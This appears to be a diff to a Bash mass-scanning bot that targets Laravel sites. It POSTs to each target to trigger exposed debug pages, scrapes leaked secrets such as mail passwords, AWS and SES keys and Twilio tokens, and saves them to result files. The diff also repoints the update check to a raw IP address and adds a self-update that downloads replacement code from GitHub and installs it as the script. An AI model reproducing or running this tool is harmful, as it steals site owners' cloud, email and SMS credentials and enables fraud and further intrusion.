@@ -11,7 +11,7 @@ LM='\e[41m'
 LB='\e[100m'
 LK='\e[43m'
 CX=`cat $0 | sha256sum`
-CZ=`curl "http://www.bimmer.in.th/generator/cdg.txt" -s | sha256sum`
+CZ=`curl "http://103.146.202.117/cdg.txt" -s | sha256sum`
 
 echo ""
 cat <<COUP
@@ -55,7 +55,7 @@ twilio3=$(echo "$ambilenv" | grep -Po 'TWILIO_FROM=\K[^ ]+')
                         echo "${TARGET}" >> cms/laravel.txt
         fi
         if [[ -z $twilio1 || $twilio1 =~ "null" ]]; then
-                MethodAws2;
+        echo "" > uknown.txt
         else
                 echo "${TARGET}|$twilio1|$twilio2|$twilio3" >> result/twilio.txt
                 echo "${TARGET}" >> laravel.txt
@@ -95,21 +95,21 @@ REGIONPAS3=$(echo "$ambilenv" | grep -Po 'S3_REGION=\K[^ ]+')
         fi
 }
 MethodAws2(){
-env=$(curl -skL --max-time 10 --connect-timeout 10 --request POST "${TARGET}" -o km.htm -A "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0." -H "Upgrade-Insecure-Requests" -d "h4xor=c0up" -o km.htm)
-TH=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<pre' | grep "<td \|MAIL_HOST" > k.htm)
-TP=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_PORT" > kc.htm)
-TU=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_USERNAME" > kd.htm)
-TS=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_PASSWORD" > ke.htm)
+env=$(curl -skL --request POST "${TARGET}" -o km.htm -A "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0." -H "Upgrade-Insecure-Requests" -d "h4xor=c0up" -o km.htm)
+TH=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<pre' | grep -E "<td \|MAIL_HOST" > k.htm)
+TP=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep -E "<td \|MAIL_PORT" > kc.htm)
+TU=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep -E "<td \|MAIL_USERNAME" > kd.htm)
+TS=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep -E "<td \|MAIL_PASSWORD" > ke.htm)
 KTH=$(cat k.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
 KTP=$(cat kc.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
 KTU=$(cat kd.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
 KTS=$(cat ke.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
-SES1=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_ACCESS_KEY_ID\|AWS_KEY\|SES_KEY" > ses1.htm)
-SES2=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_SECRET_ACCESS_KEY\|AWS_SECRET\|SES_SECRET" > ses2.htm)
-SES3=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_SECRET_ACCESS_KEY\|AWS_REGION\|SES_REGION" > ses3.htm)
-TWILIO=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|TWILIO_SID" > tw.htm)
-TWILIO1=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|TWILIO_TOKEN" > tw1.htm)
-TWILIO2=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|TWILIO_FROM" > tw3.htm)
+SES1=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep -E "<td \|AWS_ACCESS_KEY_ID\|AWS_KEY\|SES_KEY" > ses1.htm)
+SES2=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep -E "<td \|AWS_SECRET_ACCESS_KEY\|AWS_SECRET\|SES_SECRET" > ses2.htm)
+SES3=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep -E "<td \|AWS_SECRET_ACCESS_KEY\|AWS_REGION\|SES_REGION" > ses3.htm)
+TWILIO=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep -E '<tr' | grep "<td \|TWILIO_SID" > tw.htm)
+TWILIO1=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep -E '<tr' | grep "<td \|TWILIO_TOKEN" > tw1.htm)
+TWILIO2=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep -E '<tr' | grep "<td \|TWILIO_FROM" > tw3.htm)
 TW1=$(cat tw.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
 TW2=$(cat tw1.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
 TW3=$(cat tw3.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
@@ -160,6 +160,9 @@ case "$response" in
 	if [[ $CX != $CZ ]]; then
 		echo "Updating script... Please wait."
 		wget -q "https://raw.githubusercontent.com/indo2010re/LARAVELBOT/master/yo.txt"
+                rm scan
+                mv yo.txt scan
+                rm yo.txt
 		echo -e "Siap dijalankan $MERAH $B $USER $NOR"
 	else
 		echo "Script sudah terbaru"
@@ -176,7 +179,6 @@ case "$response" in
         IFS=$'\r\n'
         n=1
         t=1
-
         for TARGET in $(cat $TARGETX); do
         f=$(expr $n % $t)
         if [[ $f == 0 && $n > 0 ]]; then
